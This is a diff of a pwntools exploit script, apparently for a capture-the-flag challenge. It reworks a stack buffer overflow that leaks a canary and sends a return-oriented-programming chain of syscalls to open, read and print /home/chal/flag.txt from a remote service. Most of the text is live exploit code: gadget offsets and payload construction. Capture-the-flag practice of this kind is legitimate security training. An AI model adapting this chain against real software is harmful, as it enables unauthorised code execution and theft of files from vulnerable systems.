@@ -5,18 +5,6 @@ context.terminal = ["tmux", "splitw", "-h"]
 
 local = False
 
-# remote
-# 0x0000000000045eb0 : pop rax ; ret
-# 0x000000000002a3e5 : pop rdi ; ret
-# 0x000000000002be51 : pop rsi ; ret
-# 0x000000000003bad3 : pop rdx ; retf 0x19
-# 0x0000000000090529 : pop rdx ; pop rbx ; ret
-# 0x0000000000041c48 : pop r12 ; pop r13 ; ret
-# 0x000000000011b918 : pop r12 ; pop r14 ; ret
-# 0x0000000000035731 : pop r12 ; ret
-# 0x114990 : syscall ; ... ; ret
-
-
 # local
 # 0x00000000000420b3 : pop rax ; ret
 # 0x0000000000028265 : pop rdi ; ret
@@ -27,6 +15,18 @@ local = False
 # 0x000000000009f0e1 : pop r12 ; pop r14 ; ret
 # 0x0000000000026656 : pop r12 ; ret
 # 0x10352f:: syscall ; ... ; ret
+
+
+# remote
+# 0x0000000000045eb0 : pop rax ; ret
+# 0x000000000002a3e5 : pop rdi ; ret
+# 0x000000000002be51 : pop rsi ; ret
+# 0x000000000003bad3 : pop rdx ; retf 0x19
+# 0x0000000000090529 : pop rdx ; pop rbx ; ret
+# 0x0000000000041c48 : pop r12 ; pop r13 ; ret
+# 0x000000000011b918 : pop r12 ; pop r14 ; ret
+# 0x0000000000035731 : pop r12 ; ret
+# 0x114990 : syscall ; ... ; ret
 
 
 def calc(base: int):
@@ -93,116 +93,69 @@ def main(r):
     main_301 = self_base + 0x145E
     main_313 = self_base + 0x146A
 
-    anchor = u64(b"HACHAMA".ljust(8, b"\x00"))
+    # anchor = u64(b"HACHAMA".ljust(8, b"\x00"))
 
     bss = self_base + 0x4240
-    info(f"{bss = :x}")
-    # bss = 1 - 0x40
+    buf = bss - 0x70
+    log.info(f"{bss = :x}")
+
     payload = flat(
-        [
-            0,
-            0,
-            0,
-            0,
-            0,
-            0,
-            0,
-            canary,
-            bss,
-            pop_rax,
-            0x400,
-            main_298,
-        ]
+        {
+            0x38: [
+                canary,
+                bss,
+                pop_rax,
+                0x400,
+                main_298,
+            ]
+        }
     )
-    # input("send first payload")
     r.send(payload)
     # ret = r.recv()
     # print(ret)
-    # input("Press Enter to continue...")
-
-    payload = flat(
-        [
-            u64(b"/home/ch"),  # bss - 0x40
-            u64(b"al/flag."),
-            u64(b"txt".ljust(8, b"\x00")),
-            0,
-            0,
-            0,
-            0,
-            canary,
-            bss,
-            pop_rax,
-            2,
-            pop_rdi,
-            bss - 0x40,
-            pop_rsi,
-            0x0,
-            pop_rdx_rbx,
-            0,
-            0,
-            syscall,
-            pop_rax,
-            0,
-            pop_rdi,
-            3,
-            pop_rsi,
-            bss - 0x70,
-            pop_rdx_rbx,
-            0x100,
-            0,
-            syscall,
-            pop_rax,
-            1,
-            pop_rdi,
-            1,
-            pop_rsi,
-            bss - 0x70,
-            pop_rdx_rbx,
-            0x100,
-            0,
-            syscall,
-        ]
-    )
     input("Press Enter to continue...")
-    r.send(payload)
-    ret = r.recv()
-    print(ret)
-    return
-
-    input("quit")
-    # rbp = bss
-    payload = b"HACHAMA\x00" + flat(
-        [
-            anchor,  # bss - 0x40
-            u64(b"/home/ch"),
-            u64(b"al/flag."),  # bss - 0x30,
-            u64(b"txt").ljust(8, b"\x00"),
-            0,  # bss - 0x20,
-            # open
-            pop_rax,
-            2,  # bss - 0x10
-            pop_r12,
-            bss + 0x60,  # bss # rbp
-            pop_rdi,
-            bss - 0x38,  # bss + 0x10,
-            pop_rsi,
-            bss + 0x60,  # bss
-            pop_rdx_rbx,
-            0,
-            0,
-        ]
+    payload = flat(
+        {
+            0x00: b"/home/chal/flag.txt\x00",
+            0x38: [
+                canary,
+                bss,
+                pop_rax,
+                2,
+                pop_rdi,
+                bss - 0x40,
+                pop_rsi,
+                0x0,
+                pop_rdx_rbx,
+                0,
+                0,
+                syscall,
+                pop_rax,
+                0,
+                pop_rdi,
+                3,
+                pop_rsi,
+                buf,
+                pop_rdx_rbx,
+                0x100,
+                0,
+                syscall,
+                pop_rax,
+                1,
+                pop_rdi,
+                1,
+                pop_rsi,
+                buf,
+                pop_rdx_rbx,
+                0x100,
+                0,
+                syscall,
+            ],
+        }
     )
-    assert len(payload) <= 0x60
     r.send(payload)
-    r.interactive()
-    # payload = flat(
-    #     [
-    #         u64(b"HACHAMA".ljust(8, b"\x00")),
-    #     ]
-    # )
-    # input()
-    # r.sendline(payload)
-    # r.interactive()
+    flag = r.recvline().decode().strip()
+    log.info(flag)
 
 
 if __name__ == "__main__":
@@ -223,3 +176,4 @@ if __name__ == "__main__":
     else:
         r = remote("10.113.184.121", 10056)
     main(r)
+    r.close()
